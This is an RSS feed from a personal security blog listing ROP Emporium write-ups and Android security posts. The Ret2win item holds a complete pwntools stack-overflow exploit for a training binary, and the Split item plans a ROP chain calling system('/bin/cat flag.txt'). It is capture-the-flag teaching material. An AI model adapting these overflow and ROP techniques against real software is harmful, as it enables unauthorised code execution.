<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Solar Bits</title>
        <link>https://thuri10.github.io/</link>
        <description>Recent content on Solar Bits</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <lastBuildDate>Mon, 20 Dec 2021 20:50:44 +0300</lastBuildDate><atom:link href="https://thuri10.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>Return-Oriented Programming - Retcsu</title>
        <link>https://thuri10.github.io/p/return-oriented-programming-retcsu/</link>
        <pubDate>Mon, 20 Dec 2021 20:50:44 +0300</pubDate>
        
        <guid>https://thuri10.github.io/p/return-oriented-programming-retcsu/</guid>
        <description></description>
        </item>
        <item>
        <title>Return-Oriented Programming - Pivot</title>
        <link>https://thuri10.github.io/p/return-oriented-programming-pivot/</link>
        <pubDate>Mon, 20 Dec 2021 20:50:30 +0300</pubDate>
        
        <guid>https://thuri10.github.io/p/return-oriented-programming-pivot/</guid>
        <description></description>
        </item>
        <item>
        <title>Return-Oriented Programming - Fluff</title>
        <link>https://thuri10.github.io/p/return-oriented-programming-fluff/</link>
        <pubDate>Mon, 20 Dec 2021 20:50:20 +0300</pubDate>
        
        <guid>https://thuri10.github.io/p/return-oriented-programming-fluff/</guid>
        <description></description>
        </item>
        <item>
        <title>Return-Oriented Programming - Badchars</title>
        <link>https://thuri10.github.io/p/return-oriented-programming-badchars/</link>
        <pubDate>Mon, 20 Dec 2021 20:50:06 +0300</pubDate>
        
        <guid>https://thuri10.github.io/p/return-oriented-programming-badchars/</guid>
        <description></description>
        </item>
        <item>
        <title>Return-Oriented Programming - Write4</title>
        <link>https://thuri10.github.io/p/return-oriented-programming-write4/</link>
        <pubDate>Mon, 20 Dec 2021 20:49:54 +0300</pubDate>
        
        <guid>https://thuri10.github.io/p/return-oriented-programming-write4/</guid>
        <description></description>
        </item>
        <item>
        <title>Return-Oriented Programming - Callme</title>
        <link>https://thuri10.github.io/p/return-oriented-programming-callme/</link>
        <pubDate>Mon, 20 Dec 2021 20:49:43 +0300</pubDate>
        
        <guid>https://thuri10.github.io/p/return-oriented-programming-callme/</guid>
        <description></description>
        </item>
        <item>
        <title>Return-Oriented Programming - Split</title>
        <link>https://thuri10.github.io/p/return-oriented-programming-split/</link>
        <pubDate>Mon, 20 Dec 2021 20:49:37 +0300</pubDate>
        
        <guid>https://thuri10.github.io/p/return-oriented-programming-split/</guid>
        <description>&lt;p&gt;disassembling of the usefulfunction in the binary&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;(gdb) disas usefulFunction 
Dump of assembler code &lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; function &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;usefulFunction&lt;/span&gt;:
   &lt;span style=&#34;color:#bd93f9&#34;&gt;0x0000000000400742&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;:&lt;/span&gt;	push   rbp
   &lt;span style=&#34;color:#bd93f9&#34;&gt;0x0000000000400743&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;:&lt;/span&gt;	mov    rbp,rsp
   &lt;span style=&#34;color:#bd93f9&#34;&gt;0x0000000000400746&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;:&lt;/span&gt;	mov    edi,&lt;span style=&#34;color:#bd93f9&#34;&gt;0x40084a&lt;/span&gt;
   &lt;span style=&#34;color:#bd93f9&#34;&gt;0x000000000040074b&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;9&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;:&lt;/span&gt;	call   &lt;span style=&#34;color:#bd93f9&#34;&gt;0x400560&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt;system@plt&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#bd93f9&#34;&gt;0x0000000000400750&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;14&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;:&lt;/span&gt;	nop
   &lt;span style=&#34;color:#bd93f9&#34;&gt;0x0000000000400751&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;15&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;:&lt;/span&gt;	pop    rbp
   &lt;span style=&#34;color:#bd93f9&#34;&gt;0x0000000000400752&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;16&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;:&lt;/span&gt;	ret    
End of assembler dump.
(gdb) x&lt;span style=&#34;color:#ff79c6&#34;&gt;/&lt;/span&gt;s &lt;span style=&#34;color:#bd93f9&#34;&gt;0x40084a&lt;/span&gt;
&lt;span style=&#34;color:#bd93f9&#34;&gt;0x40084a&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;/bin/ls&amp;#34;&lt;/span&gt;
(gdb) 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;let look at the strings in order to get useful strings for our case. The goal is to read the flag from the system.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;[&lt;span style=&#34;color:#bd93f9&#34;&gt;0x004005b0&lt;/span&gt;]&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&lt;/span&gt; iz
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
&lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;   &lt;span style=&#34;color:#bd93f9&#34;&gt;0x000007e8&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;0x004007e8&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;21&lt;/span&gt;  &lt;span style=&#34;color:#bd93f9&#34;&gt;22&lt;/span&gt;   .rodata ascii split by ROP Emporium
&lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;   &lt;span style=&#34;color:#bd93f9&#34;&gt;0x000007fe&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;0x004007fe&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;7&lt;/span&gt;   &lt;span style=&#34;color:#bd93f9&#34;&gt;8&lt;/span&gt;    .rodata ascii x86_64\n
&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;   &lt;span style=&#34;color:#bd93f9&#34;&gt;0x00000806&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;0x00400806&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;8&lt;/span&gt;   &lt;span style=&#34;color:#bd93f9&#34;&gt;9&lt;/span&gt;    .rodata ascii \nExiting
&lt;span style=&#34;color:#bd93f9&#34;&gt;3&lt;/span&gt;   &lt;span style=&#34;color:#bd93f9&#34;&gt;0x00000810&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;0x00400810&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;43&lt;/span&gt;  &lt;span style=&#34;color:#bd93f9&#34;&gt;44&lt;/span&gt;   .rodata ascii Contriving a reason to ask user &lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; data...
&lt;span style=&#34;color:#bd93f9&#34;&gt;4&lt;/span&gt;   &lt;span style=&#34;color:#bd93f9&#34;&gt;0x0000083f&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;0x0040083f&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;10&lt;/span&gt;  &lt;span style=&#34;color:#bd93f9&#34;&gt;11&lt;/span&gt;   .rodata ascii Thank you&lt;span style=&#34;color:#ff79c6&#34;&gt;!&lt;/span&gt;
&lt;span style=&#34;color:#bd93f9&#34;&gt;5&lt;/span&gt;   &lt;span style=&#34;color:#bd93f9&#34;&gt;0x0000084a&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;0x0040084a&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;7&lt;/span&gt;   &lt;span style=&#34;color:#bd93f9&#34;&gt;8&lt;/span&gt;    .rodata ascii &lt;span style=&#34;color:#ff79c6&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#ff79c6&#34;&gt;/&lt;/span&gt;ls
&lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;   &lt;span style=&#34;color:#bd93f9&#34;&gt;0x00001060&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;0x00601060&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;17&lt;/span&gt;  &lt;span style=&#34;color:#bd93f9&#34;&gt;18&lt;/span&gt;   .data   ascii &lt;span style=&#34;color:#ff79c6&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#ff79c6&#34;&gt;/&lt;/span&gt;cat flag.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;using radare2 to get strings of the binary we have now an important string &amp;ldquo;/bin/cat flag.txt&amp;rdquo;&lt;/p&gt;
&lt;p&gt;we need to chain our rop to be like system(&#39;/bin/cat flag.txt&#39;)&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Return-Oriented Programming - Ret2win</title>
        <link>https://thuri10.github.io/p/return-oriented-programming-ret2win/</link>
        <pubDate>Mon, 20 Dec 2021 20:49:23 +0300</pubDate>
        
        <guid>https://thuri10.github.io/p/return-oriented-programming-ret2win/</guid>
        <description>&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;GOAL:
Locate a method that you want to call within the binary. Call it by overwriting a saved return address on the stack.&lt;/p&gt;
&lt;p&gt;find the address of the  ret2win and determine  the size of the buffer by looking at the gdb.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; info functions
All defined functions:

Non-debugging symbols:
0x0000000000400528  _init
0x0000000000400550  puts@plt
0x0000000000400560  system@plt
0x0000000000400570  printf@plt
0x0000000000400580  memset@plt
0x0000000000400590  read@plt
0x00000000004005a0  setvbuf@plt
0x00000000004005b0  _start
0x00000000004005e0  _dl_relocate_static_pie
0x00000000004005f0  deregister_tm_clones
0x0000000000400620  register_tm_clones
0x0000000000400660  __do_global_dtors_aux
0x0000000000400690  frame_dummy
0x0000000000400697  main
0x00000000004006e8  pwnme
0x0000000000400756  ret2win
0x0000000000400780  __libc_csu_init
0x00000000004007f0  __libc_csu_fini
0x00000000004007f4  _fini
&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;from the disassembly of the pwnme function, we can determine the size of the buffer we reading to.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; disas pwnme
Dump of assembler code &lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;function&lt;/span&gt; pwnme:
   0x00000000004006e8 &amp;lt;+0&amp;gt;:	push   rbp
   0x00000000004006e9 &amp;lt;+1&amp;gt;:	mov    rbp,rsp
   0x00000000004006ec &amp;lt;+4&amp;gt;:	sub    rsp,0x20
   0x00000000004006f0 &amp;lt;+8&amp;gt;:	lea    rax,&lt;span style=&#34;color:#ff79c6&#34;&gt;[&lt;/span&gt;rbp-0x20&lt;span style=&#34;color:#ff79c6&#34;&gt;]&lt;/span&gt;
   0x00000000004006f4 &amp;lt;+12&amp;gt;:	mov    edx,0x20
   0x00000000004006f9 &amp;lt;+17&amp;gt;:	mov    esi,0x0
   0x00000000004006fe &amp;lt;+22&amp;gt;:	mov    rdi,rax
   0x0000000000400701 &amp;lt;+25&amp;gt;:	call   0x400580 &amp;lt;memset@plt&amp;gt;
   0x0000000000400706 &amp;lt;+30&amp;gt;:	mov    edi,0x400838
   0x000000000040070b &amp;lt;+35&amp;gt;:	call   0x400550 &amp;lt;puts@plt&amp;gt;
   0x0000000000400710 &amp;lt;+40&amp;gt;:	mov    edi,0x400898
   0x0000000000400715 &amp;lt;+45&amp;gt;:	call   0x400550 &amp;lt;puts@plt&amp;gt;
   0x000000000040071a &amp;lt;+50&amp;gt;:	mov    edi,0x4008b8
   0x000000000040071f &amp;lt;+55&amp;gt;:	call   0x400550 &amp;lt;puts@plt&amp;gt;
   0x0000000000400724 &amp;lt;+60&amp;gt;:	mov    edi,0x400918
   0x0000000000400729 &amp;lt;+65&amp;gt;:	mov    eax,0x0
   0x000000000040072e &amp;lt;+70&amp;gt;:	call   0x400570 &amp;lt;printf@plt&amp;gt;
   0x0000000000400733 &amp;lt;+75&amp;gt;:	lea    rax,&lt;span style=&#34;color:#ff79c6&#34;&gt;[&lt;/span&gt;rbp-0x20&lt;span style=&#34;color:#ff79c6&#34;&gt;]&lt;/span&gt;
   0x0000000000400737 &amp;lt;+79&amp;gt;:	mov    edx,0x38
   0x000000000040073c &amp;lt;+84&amp;gt;:	mov    rsi,rax
   0x000000000040073f &amp;lt;+87&amp;gt;:	mov    edi,0x0
   0x0000000000400744 &amp;lt;+92&amp;gt;:	call   0x400590 &amp;lt;read@plt&amp;gt;
   0x0000000000400749 &amp;lt;+97&amp;gt;:	mov    edi,0x40091b
   0x000000000040074e &amp;lt;+102&amp;gt;:	call   0x400550 &amp;lt;puts@plt&amp;gt;
   0x0000000000400753 &amp;lt;+107&amp;gt;:	nop
   0x0000000000400754 &amp;lt;+108&amp;gt;:	leave  
   0x0000000000400755 &amp;lt;+109&amp;gt;:	ret    
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;from the above code, we are have a buffer of size 0x20(32bytes), but we are reading the  more than the buffer thus doing a stack buffer overflow.&lt;/p&gt;
&lt;p&gt;our exploit for ret2win challenge is&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python3&#34; data-lang=&#34;python3&#34;&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; pwn

pwn&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;context&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;encoding &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;latin-1&amp;#34;&lt;/span&gt; 
pwn&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;warnings&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;simplefilter(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;ignore&amp;#34;&lt;/span&gt;)
pwn&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;context&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;arch &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;amd64&amp;#34;&lt;/span&gt;

io &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;process(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;./ret2win&amp;#39;&lt;/span&gt;)

payload &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;32&lt;/span&gt; &lt;span style=&#34;color:#6272a4&#34;&gt;# fill the buffer&lt;/span&gt;
payload &lt;span style=&#34;color:#ff79c6&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;B&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;8&lt;/span&gt;  &lt;span style=&#34;color:#6272a4&#34;&gt;#overwrite saved base pointer&lt;/span&gt;
payload &lt;span style=&#34;color:#ff79c6&#34;&gt;+=&lt;/span&gt; pwn&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#bd93f9&#34;&gt;0x400756&lt;/span&gt;)  &lt;span style=&#34;color:#6272a4&#34;&gt;#Address of ret2win function&lt;/span&gt;
io&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;writeafter(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;gt;&amp;#39;&lt;/span&gt;, payload)

pwn&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;info(io&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;clean()&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;decode())
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;running the script above we get the flag as shown below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;vx@archie:ret2win$ python3 x.py 
&lt;span style=&#34;color:#ff79c6&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#ff79c6&#34;&gt;]&lt;/span&gt; Starting &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;local&lt;/span&gt; process &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;./ret2win&amp;#39;&lt;/span&gt;: pid &lt;span style=&#34;color:#bd93f9&#34;&gt;45427&lt;/span&gt;
&lt;span style=&#34;color:#ff79c6&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#ff79c6&#34;&gt;]&lt;/span&gt;  Thank you!
    Well &lt;span style=&#34;color:#ff79c6&#34;&gt;done&lt;/span&gt;! Here&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;s your flag:
&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;    ROPE{a_placeholder_32byte_flag!}
&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;[*] Process &amp;#39;&lt;/span&gt;./ret2win&amp;#39; stopped with &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;exit&lt;/span&gt; code &lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;pid 45427&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Android Malware analysis series</title>
        <link>https://thuri10.github.io/p/android-malware-analysis-series/</link>
        <pubDate>Sun, 12 Dec 2021 19:02:05 +0300</pubDate>
        
        <guid>https://thuri10.github.io/p/android-malware-analysis-series/</guid>
        <description>&lt;p&gt;the sample for analysis is Anubis
sha256 of the sample is: edda95f68c0cdf9f4c13e4e35211b42666c014f2c0831210b59296071139f159&lt;/p&gt;
&lt;p&gt;steps for analysis malware&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;decompilation&lt;/li&gt;
&lt;li&gt;static analysis of manifest files to understand file name, permissions , etc&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>Analyzing Ransomware Malware challenge</title>
        <link>https://thuri10.github.io/p/ransomware/</link>
        <pubDate>Tue, 07 Dec 2021 19:02:36 +0300</pubDate>
        
        <guid>https://thuri10.github.io/p/ransomware/</guid>
        <description></description>
        </item>
        <item>
        <title>Reversing Custom Bytecode Virtual Machine</title>
        <link>https://thuri10.github.io/p/reversing-custom-bytecode-virtual-machine/</link>
        <pubDate>Tue, 07 Dec 2021 19:02:24 +0300</pubDate>
        
        <guid>https://thuri10.github.io/p/reversing-custom-bytecode-virtual-machine/</guid>
        <description></description>
        </item>
        <item>
        <title>Static analysis of Malware Strings</title>
        <link>https://thuri10.github.io/p/static-analysis-of-malware-strings/</link>
        <pubDate>Tue, 07 Dec 2021 19:02:13 +0300</pubDate>
        
        <guid>https://thuri10.github.io/p/static-analysis-of-malware-strings/</guid>
        <description></description>
        </item>
        <item>
        <title>Android Application Security Part4</title>
        <link>https://thuri10.github.io/p/android-application-security-part4/</link>
        <pubDate>Wed, 03 Nov 2021 15:54:03 +0300</pubDate>
        
        <guid>https://thuri10.github.io/p/android-application-security-part4/</guid>
        <description>&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;show how to scan the application for default keys&lt;/li&gt;
&lt;li&gt;how to use nuclei&lt;/li&gt;
&lt;li&gt;regular expressions&lt;/li&gt;
&lt;li&gt;example of scanning for deeplinks application in an application.&lt;/li&gt;
&lt;li&gt;sanning manifest file for  deeplinks.&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;introduction-1&#34;&gt;Introduction&lt;/h2&gt;
</description>
        </item>
        <item>
        <title>Android Application security Part 3</title>
        <link>https://thuri10.github.io/p/android-application-security-part-3/</link>
        <pubDate>Wed, 27 Oct 2021 15:53:59 +0300</pubDate>
        
        <guid>https://thuri10.github.io/p/android-application-security-part-3/</guid>
        <description></description>
        </item>
        <item>
        <title>Android Application Security Part2</title>
        <link>https://thuri10.github.io/p/firebase/</link>
        <pubDate>Mon, 25 Oct 2021 15:53:55 +0300</pubDate>
        
        <guid>https://thuri10.github.io/p/firebase/</guid>
        <description>&lt;img src="https://thuri10.github.io/firebase.jpg" alt="Featured image of post Android Application Security Part2" /&gt;&lt;h2 id=&#34;insecure-storages&#34;&gt;Insecure Storages&lt;/h2&gt;
&lt;p&gt;This is the second part of the android application security. This part focuses on the local sqlite databases, firebase and AWS security.&lt;/p&gt;
&lt;h3 id=&#34;flag7---sqlite&#34;&gt;Flag7 - Sqlite&lt;/h3&gt;
&lt;p&gt;This is level is about understanding the sqlite local database in the applications folder.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;
    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;FlagSevenSqliteActivity&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#8be9fd&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;[]&lt;/span&gt; bArr &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;x&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;      &lt;span style=&#34;color:#6272a4&#34;&gt;//sqlite
&lt;/span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;        d&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;bArr&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;decodedDirectoryOne&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
        Charset charset &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; StandardCharsets&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;UTF_8&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;
        d&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;charset&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;StandardCharsets.UTF_8&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#ff79c6&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;z&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;new&lt;/span&gt; String&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;bArr&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; charset&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
